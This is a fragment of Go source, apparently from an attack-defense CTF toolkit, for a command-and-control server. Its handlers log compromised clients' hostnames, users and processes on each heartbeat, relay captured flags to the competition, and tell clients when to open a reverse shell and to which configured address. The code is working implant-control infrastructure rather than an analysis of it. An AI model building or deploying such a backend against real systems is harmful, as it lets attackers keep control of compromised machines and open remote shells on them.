package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"time"
)

func submitFlag(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	var flagData FlagSubmission
	decoder := json.NewDecoder(r.Body)
	if err := decoder.Decode(&flagData); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	if flagData.Flag == "" {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	clientIP := getClientIP(r)
	log.Printf("已提交来自 %s 的Flag: %s", clientIP, flagData.Flag)

	submitFlagToCompetition(flagData.Flag, clientIP)

	w.WriteHeader(http.StatusOK)
}

func heartbeat(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	clientIP := getClientIP(r)

	var heartbeatData HeartbeatData
	decoder := json.NewDecoder(r.Body)
	if err := decoder.Decode(&heartbeatData); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	var existingIP string
	err := db.QueryRow("SELECT ip FROM clients WHERE ip = ?", clientIP).Scan(&existingIP)

	if err == sql.ErrNoRows {
		_, err = db.Exec(`INSERT INTO clients (ip, hostname, username, process_name, pid, last_seen, revshell)
			VALUES (?, ?, ?, ?, ?, ?, 0)`,
			clientIP, heartbeatData.Hostname, heartbeatData.UserInfo,
			heartbeatData.ProcessInfo, "", time.Now().Format(time.RFC3339))

		if err != nil {
			log.Printf("添加新客户端失败: %v", err)
			w.WriteHeader(http.StatusInternalServerError)
			return
		}

		addMessage("info", "新客户端上线", fmt.Sprintf("IP: %s, 主机: %s", clientIP, heartbeatData.Hostname))
	} else if err != nil {
		log.Printf("查询客户端失败: %v", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	} else {
		_, err = db.Exec(`UPDATE clients SET hostname=?, username=?, process_name=?, pid=?, last_seen=? WHERE ip=?`,
			heartbeatData.Hostname, heartbeatData.UserInfo, heartbeatData.ProcessInfo,
			"", time.Now().Format(time.RFC3339), clientIP)

		if err != nil {
			log.Printf("更新客户端失败: %v", err)
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
	}

	var revShell int
	err = db.QueryRow("SELECT revshell FROM clients WHERE ip = ?", clientIP).Scan(&revShell)
	if err != nil {
		log.Printf("获取反弹shell状态失败: %v", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	if revShell == 1 {
		_, err = db.Exec("UPDATE clients SET revshell = 0 WHERE ip = ?", clientIP)
		if err != nil {
			log.Printf("设置反弹shell状态失败: %v", err)
		}
	}

	w.Header().Set("Content-Type", "text/plain")
	fmt.Fprintf(w, "%d", revShell)
}

func getReverseShell(w http.ResponseWriter, r *http.Request) {
	addr := getConfigValue("revshell_addr")
	w.Header().Set("Content-Type", "text/plain")
	fmt.Fprint(w, addr)
}
